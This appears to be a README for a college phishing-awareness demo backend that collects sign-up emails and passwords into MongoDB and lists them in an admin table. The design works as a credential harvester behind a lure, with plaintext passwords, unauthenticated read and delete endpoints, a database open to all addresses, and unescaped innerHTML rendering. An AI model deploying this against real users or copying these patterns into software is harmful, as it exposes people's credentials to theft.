# WallZ Awareness Demo – Backend

Educational cybersecurity awareness demonstration backend.  
Stores submitted **demo** credentials in MongoDB Atlas.

> **Reminder for participants:**  
> This is an educational demonstration only.  
> Do **NOT** enter real email addresses or real passwords.

---

## Folder Structure

```
backend/
├── server.js          # Express entry point
├── db.js              # MongoDB Atlas connection
├── package.json
├── .env.example
├── models/
│   └── Login.js       # Mongoose schema (collection: logins)
└── routes/
    └── logins.js      # API routes
```

---

## Quick Start

### 1. Create a MongoDB Atlas free cluster (M0)

1. Go to https://www.mongodb.com/cloud/atlas
2. Create a free M0 cluster
3. Create a database user (username + password)
4. Network Access → Add IP Address → **Allow Access from Anywhere** (`0.0.0.0/0`) for the demo
5. Database → Connect → Drivers → copy the connection string

### 2. Configure environment

```bash
cd backend
cp .env.example .env
```

Edit `.env` and set:

```
MONGODB_URI=mongodb+srv://YOUR_USER:YOUR_PASS@YOUR_CLUSTER.mongodb.net/awareness_demo?retryWrites=true&w=majority
PORT=3000
```

The database name `awareness_demo` is already included in the URI.

### 3. Install & run

```bash
npm install
npm start
```

You should see:

```
✅ Connected to MongoDB Atlas (database: awareness_demo)
🚀 Server listening on http://localhost:3000
```

---

## API Reference

| Method | Endpoint        | Description                          |
|--------|-----------------|--------------------------------------|
| POST   | `/login`        | Store demo email + password          |
| GET    | `/entries`      | List all entries (newest first)      |
| DELETE | `/entries/:id`  | Delete one entry by `_id`            |
| DELETE | `/entries`      | Delete **all** entries               |
| GET    | `/health`       | Health check                         |

### POST /login

**Request body**
```json
{
  "email": "demo@example.com",
  "password": "demo123"
}
```

**Success response (201)**
```json
{
  "success": true,
  "message": "Demo credentials stored successfully.",
  "id": "66a1b2c3d4e5f6789012345"
}
```

### GET /entries

**Success response (200)**
```json
{
  "success": true,
  "count": 2,
  "data": [
    {
      "_id": "...",
      "email": "demo@example.com",
      "password": "demo123",
      "timestamp": "2026-07-31T14:30:00.000Z"
    }
  ]
}
```

---

## Frontend Integration Snippets

Replace any previous Google Apps Script `fetch()` calls with the snippets below.  
**Do not change HTML layout, CSS, IDs, or class names.**

Assume the backend runs at `http://localhost:3000` (change the base URL if you deploy elsewhere).

### 1. Config / Base URL (put in `config.js` or at the top of your script)

```js
// Replace the old Google Apps Script URL
const API_BASE = "http://localhost:3000";
```

### 2. Submit login / sign-up (replace existing signup fetch)

```js
async function submitDemoCredentials(email, password) {
  try {
    const response = await fetch(`${API_BASE}/login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    const result = await response.json();

    if (result.success) {
      return { ok: true, message: result.message, id: result.id };
    } else {
      return { ok: false, message: result.message || "Something went wrong" };
    }
  } catch (err) {
    console.error("API error:", err);
    return { ok: false, message: "Network error – is the backend running?" };
  }
}
```

**Example usage inside your existing `handleSignUp`:**

```js
// After collecting name / email / password from the form...
const result = await submitDemoCredentials(email, password);

if (result.ok) {
  // Keep your existing UI success flow
  setCurrentUser({ name, email, id: email }); // or whatever you already do
  closeSignUp();
  showToast(`Welcome, ${name}! 🎉`, "success");
  // ... reward / pending download logic stays the same
} else {
  showToast(result.message, "error");
}
```

### 3. Admin – Load all entries (replace Google Sheets fetch)

```js
async function loadAdminEntries() {
  try {
    const response = await fetch(`${API_BASE}/entries`);
    const result = await response.json();

    if (!result.success) {
      console.error(result.message);
      return [];
    }
    return result.data; // array of { _id, email, password, timestamp }
  } catch (err) {
    console.error("Failed to load entries:", err);
    return [];
  }
}
```

### 4. Admin – Delete one entry

```js
async function deleteEntry(id) {
  try {
    const response = await fetch(`${API_BASE}/entries/${id}`, {
      method: "DELETE"
    });
    const result = await response.json();
    return result.success;
  } catch (err) {
    console.error("Delete failed:", err);
    return false;
  }
}
```

### 5. Admin – Delete all entries

```js
async function deleteAllEntries() {
  try {
    const response = await fetch(`${API_BASE}/entries`, {
      method: "DELETE"
    });
    const result = await response.json();
    return result.success;
  } catch (err) {
    console.error("Delete all failed:", err);
    return false;
  }
}
```

### 6. Example admin render (adapt to your existing table)

```js
async function renderAdminTable() {
  const entries = await loadAdminEntries();
  const tbody = document.getElementById("adminTableBody"); // keep your existing ID

  document.getElementById("adminTotalUsers").textContent = entries.length;
  // ... today count logic if you already have it

  if (entries.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" class="admin-empty">No users signed up yet.</td></tr>';
    return;
  }

  tbody.innerHTML = entries
    .map(
      (u, i) => `
      <tr>
        <td>${i + 1}</td>
        <td class="admin-email">${u.email}</td>
        <td class="admin-pw-cell">${u.password}</td>
        <td>${new Date(u.timestamp).toLocaleString()}</td>
        <td>
          <button onclick="handleDeleteOne('${u._id}')">Delete</button>
        </td>
      </tr>`
    )
    .join("");
}

async function handleDeleteOne(id) {
  if (!confirm("Delete this demo record?")) return;
  const ok = await deleteEntry(id);
  if (ok) await renderAdminTable(); // auto-refresh
}

async function handleDeleteAll() {
  if (!confirm("Delete ALL demo records?")) return;
  const ok = await deleteAllEntries();
  if (ok) await renderAdminTable();
}
```

---

## Notes

- The collection name is exactly `logins`.
- Documents contain only `email`, `password`, and `timestamp` (plus MongoDB `_id`).
- All validation, HTTP status codes, and error handling are implemented server-side.
- This backend is intentionally simple for a college awareness demo. Do not use it for real authentication.
